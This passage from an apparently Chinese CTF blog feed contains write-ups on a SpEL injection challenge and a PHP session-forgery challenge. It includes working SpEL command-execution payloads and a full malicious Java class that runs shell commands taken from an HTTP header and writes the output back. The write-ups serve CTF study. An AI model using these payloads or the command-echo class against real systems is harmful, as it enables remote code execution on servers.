class="hljs-type">Transformer</span>();<br></code></pre></td></tr></table></figure><p>那么触发链就清晰了，注意为了顺利到达触发点,这三个值不能为null(“_bytecodes”,”_name”,”_tfactory”)并且恶意类父类需为AbstractTranslet</p><p>这里的如何触发newTransformer()在CC链中再讲</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Polar_JAVA题WP</title>
    <link href="/2025/03/29/Polar-JAVA%E9%A2%98WP/"/>
    <url>/2025/03/29/Polar-JAVA%E9%A2%98WP/</url>
    
    <content type="html"><![CDATA[<h2 id="Polar-EzJava"><a href="#Polar-EzJava" class="headerlink" title="[Polar]EzJava"></a>[Polar]EzJava</h2><p style="font-size:10px;color:#7f8c93">题目来源：Polar<br>题目类型：WEB<br>设计考点：Spel任意命令执行</p><h3 id="认识SpEL"><a href="#认识SpEL" class="headerlink" title="认识SpEL"></a>认识SpEL</h3><p style="font-size:13px">Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。</p><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法:"></a>基本用法:</h4><p>SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p><h5 id="示例1-不注册新变量的用法"><a href="#示例1-不注册新变量的用法" class="headerlink" title="示例1:不注册新变量的用法"></a>示例1:不注册新变量的用法</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">ExpressionParser parser = <span class="hljs-keyword">new</span> SpelExpressionParser();<span class="hljs-comment">//创建解析器</span><br>Expression <span class="hljs-built_in">exp</span> = parser.parseExpression(<span class="hljs-string">&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>System.out.println( <span class="hljs-built_in">exp</span>.getValue() );<span class="hljs-comment">//取值，Hello World！</span><br></code></pre></td></tr></table></figure><h5 id="示例2-自定义注册加载变量的用法"><a href="#示例2-自定义注册加载变量的用法" class="headerlink" title="示例2:自定义注册加载变量的用法"></a>示例2:自定义注册加载变量的用法</h5><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">Spel</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> name = <span class="hljs-string">&quot;何止&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;<br>        Spel user = <span class="hljs-keyword">new</span> <span class="hljs-type">Spel</span>();<br>        StandardEvaluationContext context=<span class="hljs-keyword">new</span> <span class="hljs-type">StandardEvaluationContext</span>();<br>        context.setVariable(<span class="hljs-string">&quot;user&quot;</span>,user);<span class="hljs-comment">//通过StandardEvaluationContext注册自定义变量</span><br>        SpelExpressionParser parser = <span class="hljs-keyword">new</span> <span class="hljs-type">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br>        Expression expression = parser.parseExpression(<span class="hljs-string">&quot;#user.name&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>        System.out.println( expression.getValue(context).toString() );<span class="hljs-comment">//取值,输出何止</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>会用到的语法</p><p>spel语法中的T()操作符 , T()操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法T(全限定类名).方法名()，后面会用得到</p><p>spel中的#操作符可以用于标记对象</p><h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> BOOT-INF.classes.com.example.demo.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.EvaluationContext;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.support.StandardEvaluationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(&#123;<span class="hljs-string">&quot;/SPEL&quot;</span>&#125;)<br><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">spel</span> </span>&#123;<br>  <span class="hljs-meta">@RequestMapping</span>(&#123;<span class="hljs-string">&quot;/vul&quot;</span>&#125;)<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> spelVul(<span class="hljs-keyword">String</span> ex) &#123;<br>    SpelExpressionParser spelExpressionParser = <span class="hljs-keyword">new</span> <span class="hljs-type">SpelExpressionParser</span>();<br>    StandardEvaluationContext standardEvaluationContext = <span class="hljs-keyword">new</span> <span class="hljs-type">StandardEvaluationContext</span>();<br>    <span class="hljs-keyword">String</span> result = spelExpressionParser.parseExpression(ex).getValue((EvaluationContext)standardEvaluationContext).toString();<br>    System.out.println(result);<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看到网页的Controller层,在&#x2F;SPEL&#x2F;vul路径下接受一个ex字符串，然后用Spel对他进行解析，这里不存在任何过滤，可以直接使用SPel的任意文件执行。</p><p>首先我们构造java题常见的payload (ProcessBuilder)</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">String</span>[] str = <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;<br>ProcessBuilder p = <span class="hljs-keyword">new</span> <span class="hljs-type">ProcessBuilder</span>( str );<br>p.start();<span class="hljs-comment">//打开计算器</span><br>Spel也可以使用<span class="hljs-keyword">new</span><span class="hljs-type"></span>的方法将多行代码汇聚成一行<br><br><span class="hljs-keyword">new</span> <span class="hljs-type">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure><p>若需要Shell反弹则使用Runtime类，但是在Runtime类的实例需要他的静态方法getRuntime来获取，所以在Spel我们需要T()来获取Runtime类的Object</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">T(java.lang.<span class="hljs-keyword">Runtime</span>).getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>T(java.lang.<span class="hljs-keyword">Runtime</span>)的作用就是 <span class="hljs-keyword">Runtime</span> rt=<span class="hljs-keyword">Runtime</span>.getRuntime()中的rt;<br></code></pre></td></tr></table></figure><p>本题中直接将获取到的ex值传入Spel,所以我们只需要把payload传给ex即可</p><p><img src="/../img/Polar/EzJava1.png" alt="web1"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">new java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.BufferedReader</span>(new java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.InputStreamReader</span><br>(new <span class="hljs-built_in">ProcessBuilder</span>(new String<span class="hljs-selector-attr">[]</span>&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;cat /app/flag.txt&quot;</span>&#125;)<span class="hljs-selector-class">.start</span>()<span class="hljs-selector-class">.getInputStream</span>(), <span class="hljs-string">&quot;gbk&quot;</span>))<span class="hljs-selector-class">.readLine</span>()<br></code></pre></td></tr></table></figure><h2 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringEcho</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        org.springframework.web.context.request.<span class="hljs-type">RequestAttributes</span> <span class="hljs-variable">requestAttributes</span> <span class="hljs-operator">=</span> org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();<br>        javax.servlet.http.<span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">httprequest</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();<br>        javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">httpresponse</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();<br>        String[] cmd = System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;windows&quot;</span>)? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, httprequest.getHeader(<span class="hljs-string">&quot;C&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, httprequest.getHeader(<span class="hljs-string">&quot;C&quot;</span>)&#125;;<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">try</span> &#123;<br>            result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next().getBytes();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            httpresponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(result));<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            httpresponse.getWriter().flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            httpresponse.getWriter().close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Notes</title>
    <link href="/2025/03/15/%5Bharekazectf2019%5DeasyNotes/"/>
    <url>/2025/03/15/%5Bharekazectf2019%5DeasyNotes/</url>
    
    <content type="html"><![CDATA[<h2 id="harekazectf2019-easyNotes"><a href="#harekazectf2019-easyNotes" class="headerlink" title="[harekazectf2019]easyNotes"></a>[harekazectf2019]easyNotes</h2><p style="font-size:10px;color:#7f8c93">题目来源：BUUCTF<br>题目类型：WEB<br>设计考点：Session伪造,Session反序列化</p><p><img src="/../img/easyNotes/1.png" alt="web1"></p><p><img src="/../img/easyNotes/2.png" alt="web2"><br>这是一个note服务网页，登录后可以添加note包括标题和内容，然后可以打包成ZIP或者TAR文件进行下载，题目提供了源码首先进行代码审计</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Get flag<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_admin</span>()) &#123;</span><br><span class="language-php">      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! The flag is: &lt;code&gt;&quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>) . <span class="hljs-string">&quot;&lt;/code&gt;&quot;</span>;</span><br><span class="language-php">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not an admin :(&quot;</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>通过审计该代码，我们发现当is_admin函数返回值为true时即可得到flag，我们跟进is_admin函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>;<br>&#125;<br>发现他是获取的SESSION文件中的admin值<br>那么思路就是怎么伪造session<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;TEMP_DIR&#x27;</span>, <span class="hljs-string">&#x27;/var/www/tmp&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这个文件标识了临时文件存储路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#lip.php(定义了一些函数)</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">redirect</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$path</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// utility functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>, ENT_QUOTES);<br>&#125;<br><br><span class="hljs-comment">// user-related functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validate_user</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$user</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\A[0-9A-Z_-]&#123;4,64&#125;\z/i&#x27;</span>, <span class="hljs-variable">$user</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_logged_in</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_user</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>) </span>&#123;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$user</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_user</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// note-related functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_notes</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = [];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_note</span>(<span class="hljs-params"><span class="hljs-variable">$title</span>, <span class="hljs-variable">$body</span></span>) </span>&#123;<br>  <span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br>  <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$notes</span>, [<br>    <span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<br>    <span class="hljs-string">&#x27;body&#x27;</span> =&gt; <span class="hljs-variable">$body</span>,<br>    <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-title function_ invoke__">microtime</span>())<br>  ]);<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = <span class="hljs-variable">$notes</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find_note</span>(<span class="hljs-params"><span class="hljs-variable">$notes</span>, <span class="hljs-variable">$id</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>][<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-variable">$id</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$index</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete_note</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;<br>  <span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br>  <span class="hljs-variable">$index</span> = <span class="hljs-title function_ invoke__">find_note</span>(<span class="hljs-variable">$notes</span>, <span class="hljs-variable">$id</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$index</span> !== <span class="hljs-literal">FALSE</span>) &#123;<br>    <span class="hljs-title function_ invoke__">array_splice</span>(<span class="hljs-variable">$notes</span>, <span class="hljs-variable">$index</span>, <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = <span class="hljs-variable">$notes</span>;<br>&#125;<br><span class="hljs-comment">#init.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">session_save_path</span>(TEMP_DIR);<span class="hljs-comment">#标识了session文件保存路径</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#export.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;init.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_logged_in</span>()) &#123;<br>  <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/?page=home&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span 